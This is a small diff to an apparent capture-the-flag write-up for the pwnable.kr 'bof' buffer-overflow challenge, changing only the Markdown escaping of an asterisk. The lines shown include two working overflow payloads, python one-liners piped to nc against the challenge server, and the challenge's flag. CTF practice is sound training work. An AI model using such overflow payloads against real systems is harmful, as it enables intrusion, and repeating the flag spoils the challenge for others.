@@ -48,7 +48,7 @@ payload : (python -c "print 'A'*48 + '\x64\x06'") | nc pwnable.kr 9000
 
 ![fig4](https://github.com/tjrkddnr/CTF/blob/master/pwnable/Toddler's%20Bottle/bof/fig4.jpg?raw=true)
 
-**payload : (python -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000**
+**payload : (python -c "print 'A'\*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000**
 
 ***flag : daddy, I just pwned a buFFer :)***
 
